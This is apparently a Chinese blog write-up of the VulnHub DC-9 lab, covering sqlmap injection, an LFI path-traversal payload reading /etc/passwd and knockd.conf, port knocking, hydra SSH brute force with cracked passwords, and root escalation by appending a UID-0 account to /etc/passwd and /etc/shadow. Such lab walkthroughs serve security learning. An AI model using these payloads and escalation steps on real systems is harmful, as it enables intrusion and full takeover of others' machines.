---
cover: /images/VulnHub.jpg
title: VulnHub DC-9 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - 提权 SQL注入
  - 提权
abbrlink: f10adb67
date: 2026-03-18 12:00:00# VulnHub DC-9 靶机渗透测试笔记

> **靶机信息**
>
> - 靶机名称：DC-9（DC 系列最终章 🎯）
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐⭐☆（较难）
> - 涉及技术：SQL 注入、文件包含（LFI）、Port Knocking、SSH 爆破、sudo 提权、/etc/passwd 写入提权
> - https://www.cnblogs.com/wrold/p/19687335

---

## 一、信息收集

### 1.1 主机发现

```bash
nmap -sn 192.168.168.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image1.png)

目标 IP：`192.168.168.169`

### 1.2 端口与服务扫描

```bash
nmap -A -p- 192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image2.png)

扫到 SSH，但是被防火墙拦截：

> **💡 filtered 和 open 的区别：**
>
> | 状态 | 含义 |
> |------|------|
> | open | 端口开放，可以直接连 |
> | filtered | 被防火墙拦截，连不上 |
> | closed | 端口关闭 |
>
> **filtered 就是 knockd 在生效**，SSH 存在但被防火墙挡住了，需要先「敲门」才能变成 open，这就是本题的关键机制之一。

---

## 二、SQL 注入

### 2.1 发现注入点

依旧改hosts

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image3.png)

有个搜索功能，用 Burp Suite 抓包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image4.png)

POST 抓包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image5.png)

标记注入点，保存为 sql.txt，用 sqlmap 跑：

```bash
python sqlmap.py -r D:\Backup\桌面\sql.txt --dbs
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image6.png)

跑出来了，有两个库：

这个后续的ssh爆破有用

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image7.png)

找到admin的密码

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image8.png)

### 2.2 破解哈希

把拿到的哈希去在线网站解密：

```
https://hashes.com/zh/decrypt/hash
856f5de590ef37314e7c3bdf6f8a66dc → transorbital1
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image9.png)

### 2.3 登录后台

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image10.png)

后台有个添加记录功能：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image11.png)

显示所有记录，可以看到刚刚输入的信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image12.png)

不过好像没啥用，还是拿不到 Web 权限，换个思路继续找。

---

## 三、文件包含漏洞（LFI）

### 3.1 发现文件包含

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image13.png)

看到一个「文件不存在」的提示，感觉有文件包含，随便试了一下：

```
http://wordy/manage.php?file=../../../../../../etc/passwd
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image14.png)

成功读取到 `/etc/passwd`！

> 正常情况下应该还是需要 fuzz 一下参数名的，用 bp 或者 ffuf 都行。

### 3.2 用 LFI 读取 knockd.conf

不会了，涉及到知识盲区，翻 wp 了解到一个 `/etc/knockd.conf` 文件，里面记录了 SSH 的 port knocking 配置。

用 LFI 读取配置文件获取敲门序列：

```
http://192.168.168.169/manage.php?file=../../../../../../../etc/knockd.conf
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image15.png)

> **💡 这就是 LFI 的价值所在：** 不仅能读 `/etc/passwd`，还能读各种敏感配置文件，比如这里的 knockd.conf，直接暴露了敲门序列。

---

## 四、Port Knocking 敲门

读出来的配置意思是：

**🔓 开启 SSH（openSSH）：** 按顺序敲这三个端口：`7469 → 8475 → 9842`，敲完后 SSH 的 22 端口才会对你开放。

**🔒 关闭 SSH（closeSSH）：** 按顺序敲：`9842 → 8475 → 7469`（反过来）

敲门有三种方法：

**方法一：knock 工具（最简单）**
```bash
# Kali 安装
apt install knockd
# 敲门
knock 192.168.168.169 7469 8475 9842
```

**方法二：nmap 逐个敲**
```bash
nmap -Pn --host-timeout 201 --max-retries 0 -p 7469 192.168.168.169
nmap -Pn --host-timeout 201 --max-retries 0 -p 8475 192.168.168.169
nmap -Pn --host-timeout 201 --max-retries 0 -p 9842 192.168.168.169
```

**方法三：nc 敲**
```bash
nc -z 192.168.168.169 7469
nc -z 192.168.168.169 8475
nc -z 192.168.168.169 9842
```

> ⚠️ 注意：配置中 `seq_timeout = 25`，只有 **25 秒**的时间窗口，敲完要立刻 SSH 连接！

用第一种方法后就正常了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image16.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image17.png)

---

## 五、SSH 爆破

### 5.1 提取数据库账号密码

之前 SQL 注入还有另一个库，保存一下账号密码，用 hydra 爆破 SSH。

关于数据库里的数据怎么快速提取出来，可以写脚本，或者直接让 AI 帮你提：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image19.png)

### 5.2 第一轮爆破

```bash
hydra -L u.txt -P p.txt 192.168.168.169 ssh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image18.png)

结果出现了三个：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image20.png)

```
login: chandlerb   password: UrAG0D!
login: joeyt       password: Passw0rd
login: janitor     password: Ilovepeepee
```

### 5.3 翻用户目录发现新密码

都翻一下，在 janitor 的 `.secrets-for-putin` 目录里发现了新密码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image21.png)

```bash
cat > p.txt << EOF
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
EOF
```

### 5.4 第二轮爆破

```bash
hydra -L u.txt -P p.txt 192.168.168.169 ssh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image22.png)

又爆出了新用户，SSH 登录 fredf：

```bash
ssh fredf@192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image23.png)

发现一个 sudo 特权！

---

## 六、分析 test 二进制文件

### 6.1 查看文件内容

本来想直接 cat 看看啥东西的，结果蹦我一脸乱码，应该是个二进制文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image24.png)

用 strings 提取可读字符串大概看看：

```bash
strings /opt/devstuff/dist/test/test
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image25.png)

不过还是太多了，直接执行看看：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image26.png)

是 Python 打包后的二进制，找一下源代码：

```bash
find / -name "test.py" 2>/dev/null
cat /opt/devstuff/test.py
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image27.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image28.png)

### 6.2 分析源码

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image29.png)

> **📝 分析含义：** 需要三个参数，如果不是 3 则输出 "Usage: ..."，满足 3 个参数，则把第 2 个参数的文件内容**追加写入**到第 3 个参数的文件中。
>
> **💡 提权思路：**
>
> 1. `/opt/devstuff/dist/test/test` 可以以 root 身份运行
> 2. 构造有 root 权限的账户写入 /etc/passwd 或 /etc/shadow
> 3. 以该用户登录系统

---

## 七、提权

### 7.1 尝试无密码写入 passwd（失败）

那可以直接创建一个无密码用户写到 passwd 里试试：

```bash
echo 'hack::0:0:hack:/root:/bin/bash' > /tmp/hack.txt
sudo ./test /tmp/hack.txt /etc/passwd
su hack
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image30.png)

失败了，还是得加密码才行。

### 7.2 尝试 MD5 哈希写入 passwd（失败）

加密码必须要 hash 加密，用 openssl 方便：

```bash
openssl passwd -1 123456
```

> **passwd 密码字段结构：**
> ```
> hack : x : 0 : 0 : hack : /root : /bin/bash
>  ①    ②   ③   ④    ⑤      ⑥         ⑦
> ```
> | 字段 | 含义 |
> |------|------|
> | ① | 用户名 |
> | ② | 密码（x=去shadow找，空=无密码，哈希=直接验证） |
> | ③ | UID（0就是root权限） |
> | ④ | GID（组ID） |
> | ⑤ | 备注 |
> | ⑥ | 家目录 |
> | ⑦ | 登录shell |

密码格式是 `$1$盐值$哈希值`，每次盐值不同所以哈希不一样，但都是 123456 的哈希：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image31.png)

```bash
echo 'hack:$1$3MSvX.EZ$ow32gSnIJJZWUeUkZ0cX50:0:0:hack:/root:/bin/bash' > /tmp/hack.txt
sudo ./test /tmp/hack.txt /etc/passwd
su hack  # 输入 123456
```

又失败了！

> **原因分析：** 加了 `-1` 参数生成的是 MD5-crypt 格式（`$1$`），系统不去 passwd 验证，直接找 shadow 认证。只有不加参数用 `openssl passwd 123456` 生成旧版本的 DES 加密，才会去 passwd 找密码。（也有可能是我环境问题）

### 7.3 成功提权 🎉

既然该用户有 root 权限的读写，直接改 shadow 文件也行：

```bash
# 生成 SHA-512 哈希
openssl passwd -6 123456

# 写入 shadow
echo 'hackerx:$6$xxx....:18259:0:99999:7:::' > /tmp/h.txt
sudo /opt/devstuff/dist/test/test /tmp/h.txt /etc/shadow

# 写入 passwd
echo 'hackerx:x:0:0:hackerx:/root:/bin/bash' > /tmp/p.txt
sudo /opt/devstuff/dist/test/test /tmp/p.txt /etc/passwd

# 登录
su - hackerx
# 输入 123456
```

> **📋 测试总结（可能是我环境问题）：**
>
> | 方式 | 结果 |
> |------|------|
> | passwd 无密码 `::` | ❌ PAM 强制要求密码不能为空 |
> | passwd 写 MD5 哈希（`-1`） | ❌ 系统去 shadow 找，找不到拒绝 |
> | passwd 写 DES 哈希（不加参数） | ✅ 直接在 passwd 验证，成功 |
> | shadow 写 SHA-512 哈希（`-6`） | ✅ 正常验证，成功 |

最终拿到 root，取得 flag：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image32.png)

---

## 八、渗透流程总结

```
信息收集（nmap）→ 发现 SSH filtered（knockd） + Web 80
    ↓
发现搜索功能 → Burp Suite 抓包 → sqlmap POST 注入
    → 拿到哈希 → hashes.com 破解 → 登录后台
    ↓
发现「文件不存在」提示 → LFI 读取 /etc/passwd
    → 读取 /etc/knockd.conf → 获取敲门序列 7469→8475→9842
    ↓
knock 敲门 → SSH 22 端口开放
    ↓
hydra 第一轮爆破 → chandlerb/joeyt/janitor
    → janitor 目录发现新密码
    → hydra 第二轮爆破 → fredf/B4-Tru3-001
    ↓
fredf sudo 分析 test.py → 可以 root 身份写入任意文件
    ↓
写入 /etc/shadow（SHA-512 哈希）+ /etc/passwd → su 新用户 → root
    ↓
cat /root/theflag.txt → flag ✅
```

---

## 九、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| Burp Suite | 抓包获取 POST 数据 |
| sqlmap | POST 注入自动化利用 |
| hashes.com | 在线哈希解密 |
| dirsearch | Web 目录扫描 |
| LFI | 读取敏感配置文件 |
| knock | Port Knocking 敲门 |
| hydra | SSH 密码爆破 |
| openssl | 生成 passwd/shadow 哈希 |
| strings | 提取二进制文件可读字符串 |

---

> 本文为 VulnHub DC-9 靶机学习笔记，DC 系列最终章。所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
